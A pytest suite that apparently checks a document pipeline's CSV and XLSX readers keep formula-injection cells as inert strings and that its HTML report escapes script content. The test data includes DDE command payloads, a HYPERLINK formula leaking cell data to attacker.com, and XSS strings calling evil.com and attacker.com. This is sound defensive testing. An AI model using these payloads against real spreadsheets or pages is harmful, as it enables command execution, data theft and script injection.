"""Adversarial test suite: Formula injection (CSV / XLSX) mitigation and HTML escaping.

Tests coverage:
1. CSV containing formula injection payloads (=cmd|..., @SUM(...), -2+3*cmd, +cmd|..., =HYPERLINK(...)).
2. Stored inertly as strings without evaluation or execution.
3. XLSX containing formulas loaded without evaluation, storing formulas inertly in metadata.
4. Dangerous payloads containing HTML/XSS scripts are rendered HTML-escaped.
"""

from __future__ import annotations

import html
from pathlib import Path

import openpyxl
import pytest

from atlas.contracts.enums import JobState
from atlas.contracts.records import CaseResult, DocumentRecord, RunMeta
from atlas.output.report_html import highlight_quotes_in_text, render_report_html
from atlas.tabular.csv_reader import read_csv
from atlas.tabular.xlsx_reader import read_xlsx

pytestmark = pytest.mark.gate5


@pytest.mark.gate5
def test_csv_formula_injection_cells_stored_inertly_as_strings(tmp_path: Path) -> None:
    """CSV cells with formula prefixes (=, +, -, @) are read purely as inert strings."""
    csv_file = tmp_path / "formula_attack.csv"
    csv_content = (
        "header_target,header_detail\n"
        "=cmd|'/C calc'!A0,normal_value\n"
        "@SUM(1+1)*cmd|' /C calc'!A0,detail2\n"
        "-2+3*cmd|' /C calc'!A0,detail3\n"
        "+cmd|' /C calc'!A0,detail4\n"
        '=HYPERLINK("http://attacker.com/leak?q="&A1, "Click"),detail5\n'
    )
    csv_file.write_text(csv_content, encoding="utf-8")

    result = read_csv(csv_file)
    rows = result["rows"]
    assert len(rows) == 5

    # Formulas must be read as raw inert strings
    assert rows[0]["values"]["header_target"] == "=cmd|'/C calc'!A0"
    assert rows[1]["values"]["header_target"] == "@SUM(1+1)*cmd|' /C calc'!A0"
    assert rows[2]["values"]["header_target"] == "-2+3*cmd|' /C calc'!A0"
    assert rows[3]["values"]["header_target"] == "+cmd|' /C calc'!A0"
    assert rows[4]["values"]["header_target"].startswith("=HYPERLINK(")

    # Verify no execution happened and rows remain dictionary mapping of strings
    for r in rows:
        val = r["values"]["header_target"]
        assert isinstance(val, str)


@pytest.mark.gate5
def test_xlsx_formula_injection_cells_never_evaluated(tmp_path: Path) -> None:
    """XLSX formula cells are preserved inertly in formula metadata and never evaluated."""
    xlsx_file = tmp_path / "formula_attack.xlsx"

    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "Sheet1"
    ws.append(["Command", "Description"])
    ws.append(["=cmd|'/C calc'!A0", "Calculator launch attempt"])
    ws.append(["@SUM(1,2)", "Openpyxl formula"])
    ws.append(["-2+3*cmd", "Negative prefix formula"])
    ws.append(["+cmd|' /C calc'!A0", "Positive prefix formula"])
    wb.save(xlsx_file)

    parsed = read_xlsx(xlsx_file)
    sheets = parsed["sheets"]
    assert len(sheets) == 1

    sheet1 = sheets[0]
    formulas = sheet1["formulas"]
    formula_texts = [f["formula"] for f in formulas]

    # Formulas are recorded in the metadata list
    assert "=cmd|'/C calc'!A0" in formula_texts

    # Cell values in rows are not executed; eff_val is cached_val (None when uncached)
    rows = sheet1["rows"]
    assert len(rows) == 4
    # The cell value does not execute code; returns None or raw string
    for r in rows:
        val = r["values"].get("Command")
        assert val is None or isinstance(val, str)


@pytest.mark.gate5
def test_formula_injection_cells_rendered_html_escaped() -> None:
    """Malicious formulas containing HTML or script tags must be strictly HTML-escaped."""
    dangerous_payloads = [
        '=cmd|"/C powershell -c <script>alert(1)</script>"',
        "+HYPERLINK(\"<iframe src='http://evil.com'></iframe>\")",
        "@SUM(\"<b onmouseover='alert(1)'>test</b>\")",
        "-1+1 <script>fetch('http://attacker.com')</script>",
    ]

    for payload in dangerous_payloads:
        # 1. highlight_quotes_in_text escaping
        highlighted = highlight_quotes_in_text(payload, [payload])
        assert "<script>" not in highlighted
        assert "<iframe>" not in highlighted
        assert "<b onmouseover" not in highlighted
        assert "&lt;" in highlighted or "&quot;" in highlighted

    # 2. End-to-end report rendering with HTML autoescape
    doc_rec = DocumentRecord(
        doc_id="DOC-formula001",
        file_name="evidence.csv",
        file_sha256="0" * 64,
        size_bytes=100,
        detected_type="csv",
    )
    run_meta = RunMeta(
        run_id="RUN-20261016T120000Z-abcdef",
        pipeline_version="0.1.0",
        provider="mock",
        model="mock-v1",
        ocr_engine="tesseract",
        ocr_version="5.3.0",
        ocr_langs=["eng"],
        prompt_version="extract-v1",
        schema_version="dev3-v1",
        normalization_version="dev3-v1",
        resolver_version="0.1.0",
        idempotency_key="0" * 64,
        started_at="2026-10-16T12:00:00Z",
    )
    case_res = CaseResult(
        case_id="CASE-FORMULA-01",
        state=JobState.COMPLETED_WITH_WARNINGS,
        run=run_meta,
        documents=[doc_rec],
        mentions=[],
        relationships=[],
        events=[],
        aggregates=[],
        review_items=[],
        rejections=[],
        warnings=["Formula alert: <script>alert('xss')</script>"],
    )

    rendered_html = render_report_html(
        case_result=case_res,
        raw_texts={"DOC-formula001": '=cmd|"/C calc <script>alert(1)</script>"'},
    )

    # Must contain HTML-escaped tokens and zero unescaped executable script tags from the payload
    assert "<script>alert(1)</script>" not in rendered_html
    assert "<script>alert('xss')</script>" not in rendered_html
    assert (
        "&lt;script&gt;alert(1)&lt;/script&gt;" in rendered_html
        or html.escape("<script>alert(1)</script>") in rendered_html
    )
